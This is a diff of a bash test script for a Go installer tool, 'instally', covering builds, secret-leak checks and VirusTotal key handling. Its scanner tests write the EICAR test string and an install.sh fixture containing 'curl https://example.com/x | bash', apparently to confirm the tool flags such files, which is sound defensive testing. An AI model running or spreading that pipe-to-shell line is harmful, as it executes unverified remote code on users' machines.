@@ -4,23 +4,25 @@ ROOT="$(cd "$(dirname "$0")/.." && pwd)"
 cd "$ROOT" || exit 1
 LOG="${1:-expanded-checks.log}"
 : > "$LOG"
+TMP="$(mktemp -d)"
+trap 'rm -rf "$TMP"' EXIT INT TERM
 pass=0
 fail=0
 n=0
 say(){ printf '%s\n' "$*" | tee -a "$LOG" >/dev/null; }
 check(){
   n=$((n+1)); name="$1"; shift
-  out="$($@ 2>&1)"; code=$?
+  out="$("$@" 2>&1)"; code=$?
   if [ $code -eq 0 ]; then pass=$((pass+1)); say "PASS $n $name"; else fail=$((fail+1)); say "FAIL $n $name code=$code cmd=$*"; say "$out"; fi
 }
 check_contains(){
   n=$((n+1)); name="$1"; want="$2"; shift 2
-  out="$($@ 2>&1)"; code=$?
+  out="$("$@" 2>&1)"; code=$?
   if [ $code -eq 0 ] && printf '%s' "$out" | grep -Fq -- "$want"; then pass=$((pass+1)); say "PASS $n $name"; else fail=$((fail+1)); say "FAIL $n $name code=$code want=$want cmd=$*"; say "$out"; fi
 }
 check_fail_contains(){
   n=$((n+1)); name="$1"; want="$2"; shift 2
-  out="$($@ 2>&1)"; code=$?
+  out="$("$@" 2>&1)"; code=$?
   if [ $code -ne 0 ] && printf '%s' "$out" | grep -Fq -- "$want"; then pass=$((pass+1)); say "PASS $n $name"; else fail=$((fail+1)); say "FAIL $n $name code=$code want-fail=$want cmd=$*"; say "$out"; fi
 }
 check_no_secret(){
@@ -32,9 +34,9 @@ check_no_secret(){
 SECRET="${INSTALLY_TEST_SECRET:-}"
 check "go test" go test ./...
 check "go build linux host" go build -o instally ./cmd/instally
-check "cross windows" env GOOS=windows GOARCH=amd64 go build -o /tmp/instally-check.exe ./cmd/instally
-check "cross darwin amd64" env GOOS=darwin GOARCH=amd64 go build -o /tmp/instally-check-darwin ./cmd/instally
-check "cross darwin arm64" env GOOS=darwin GOARCH=arm64 go build -o /tmp/instally-check-darwin-arm64 ./cmd/instally
+check "cross windows" env GOOS=windows GOARCH=amd64 go build -o "$TMP/instally-check.exe" ./cmd/instally
+check "cross darwin amd64" env GOOS=darwin GOARCH=amd64 go build -o "$TMP/instally-check-darwin" ./cmd/instally
+check "cross darwin arm64" env GOOS=darwin GOARCH=arm64 go build -o "$TMP/instally-check-darwin-arm64" ./cmd/instally
 check "shell scripts" bash -n install.sh install-full.sh uninstall.sh install-macos.sh build-native.sh native/fyne/scripts/install-linux-build-deps.sh
 check_no_secret "api key not embedded" "$SECRET"
 check_contains "support has archive safety" "Archive safety" ./instally --support
@@ -42,8 +44,6 @@ check_contains "vt status no leak" "VirusTotal" ./instally --vt-status
 check_contains "vt test no key" "VirusTotal test" ./instally --vt-test
 n=$((n+1)); tmpvt="$(mktemp -d)"; out="$(printf dummy-key | INSTALLY_DATA_DIR="$tmpvt" ./instally --vt-save-key-stdin 2>&1)"; code=$?; if [ $code -eq 0 ] && printf '%s' "$out" | grep -Fq -- "saved" && ! printf '%s' "$out" | grep -Fq -- "dummy-key"; then pass=$((pass+1)); say "PASS $n vt save stdin no echo"; else fail=$((fail+1)); say "FAIL $n vt save stdin no echo code=$code"; say "$out"; fi
 check_contains "security test detects EICAR" "OK: test signature" ./instally --security-test
-
-TMP="$(mktemp -d)"
 printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$TMP/eicar.com"
 check_fail_contains "scan EICAR blocked" "unsafe" ./instally --scan "$TMP/eicar.com"
 printf '#!/bin/sh\ncurl https://example.com/x | bash\n' > "$TMP/install.sh"
